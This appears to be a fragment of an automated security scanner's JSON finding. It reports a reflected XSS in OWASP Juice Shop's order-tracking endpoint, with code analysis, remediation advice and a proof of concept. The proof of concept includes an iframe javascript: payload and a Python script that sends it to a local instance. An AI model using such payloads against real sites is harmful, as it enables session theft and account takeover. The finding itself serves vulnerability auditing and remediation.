          "properties": {
            "security-severity": "6.1",
            "strix": {
              "id": "vuln-0004",
              "severity": "medium",
              "cvss": 6.1,
              "timestamp": "2026-05-09 09:46:06 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/track-order/:id",
              "method": "GET",
              "cwe": "CWE-79",
              "impact": "Successful exploitation enables an attacker to:\n\n- Execute arbitrary JavaScript in the context of the victim's authenticated session\n- Steal session tokens, cookies, and sensitive user data\n- Perform actions on behalf of the authenticated user (order placement, profile modification, password change)\n- Redirect the user to phishing pages or inject credential-harvesting overlays\n- Chain with other vulnerabilities for full account takeover\n\nThe attack requires only that a victim clicks a crafted link, making it highly exploitable in phishing or social engineering campaigns.",
              "technical_analysis": "The vulnerability exists in `routes/trackOrder.ts` at line 15. The order tracking function processes the `:id` route parameter with a conditional sanitization path:\n\n```typescript\nconst id = !utils.isChallengeEnabled(challenges.reflectedXssChallenge)\n  ? String(req.params.id).replace(/[^\\w-]+/g, '')\n  : utils.trunc(req.params.id, 60)\n```\n\nWhen `reflectedXssChallenge` is enabled (the default configuration), the code uses `utils.trunc()` which only truncates to 60 characters and strips newlines — it does not remove or encode HTML special characters (`<`, `>`, `\"`, `'`, `/`).\n\nThe unsanitized `id` value flows into two sinks:\n\n1. A MongoDB `$where` clause (separate NoSQL injection issue)\n2. The JSON response body at line 22: `result.data[0] = { orderId: id }`\n\nWhen the application serves this JSON and a client-side renderer interprets the `orderId` field without output encoding, the injected HTML/script content executes in the browser. Additionally, if the response `Content-Type` is not strictly `application/json` or a browser MIME-sniffs the response, direct rendering of the payload can occur.",
              "remediation_steps": "1. Replace the length-only truncation with strict input validation that removes or encodes all HTML-special characters regardless of challenge configuration:\n\n   ```typescript\n   const id = String(req.params.id).replace(/[^\\w-]+/g, '')\n   ```\n\n2. Apply consistent output encoding when reflecting any user input in responses, even in JSON values that will be rendered by the frontend.\n\n3. Implement Content-Security-Policy headers that prevent inline script execution on all endpoints returning user-controlled data.\n\n4. On the client side, ensure Angular templates use safe interpolation (`{{ }}` with automatic escaping) rather than `innerHTML` bindings when rendering order tracking results.",
              "poc": {
                "description": "To reproduce:\n\n1. Access the order tracking endpoint with an XSS payload in the route parameter:\n   `GET /rest/track-order/<iframe src=\"javascript:alert(`xss`)\">`\n\n2. The server truncates the input to 60 characters but does not sanitize HTML metacharacters.\n\n3. Since no order matches this ID, the server sets `result.data[0] = { orderId: id }` and returns it in the JSON response.\n\n4. The response body contains the unsanitized payload:\n   ```json\n   {\"status\":\"success\",\"data\":[{\"orderId\":\"<iframe src=\\\"javascript:alert(`xss`)\\\">\"}]}\n   ```\n\n5. When this value is rendered by the Angular frontend's order tracking result view without proper output encoding, the injected iframe executes JavaScript in the user's browser.",
                "script": "import requests\nfrom urllib.parse import quote\n\nBASE_URL = \"http://localhost:3000\"\nENDPOINT = \"/rest/track-order/\"\n\n# XSS payload that fits within 60-character truncation limit\npayload = '<iframe src=\"javascript:alert(`xss`)\">'\nassert len(payload) <= 60, f\"Payload too long: {len(payload)} chars\"\n\n# URL-encode the payload for the request\nencoded_payload = quote(payload)\nurl = f\"{BASE_URL}{ENDPOINT}{encoded_payload}\"\n\nprint(f\"[*] Testing Reflected XSS in order tracking\")\nprint(f\"[*] Payload ({len(payload)} chars): {payload}\")\nprint(f\"[*] Request URL: {url}\")\nprint()\n\ntry:\n    resp = requests.get(url, timeout=10)\n    print(f\"[*] Response status: {resp.status_code}\")\n    print(f\"[*] Response body: {resp.text[:500]}\")\n    print()\n\n    # Check if payload is reflected without encoding\n    if payload in resp.text or 'javascript:alert' in resp.text:\n        print(\"[+] VULNERABLE: XSS payload reflected in response without sanitization!\")\n        print(f\"[+] The payload '{payload}' appears unencoded in the server response.\")\n    else:\n        print(\"[-] Payload not directly reflected (may be encoded)\")\nexcept requests.exceptions.ConnectionError:\n    print(\"[!] Could not connect to target. Verify the application is running.\")\n    print(\"[!] The vulnerability is confirmed via source code analysis:\")\n    print(f\"[!] File: routes/trackOrder.ts, Line 15\")\n    print(f\"[!] utils.trunc() only truncates length, does not sanitize HTML chars\")"
              }
            }
          }
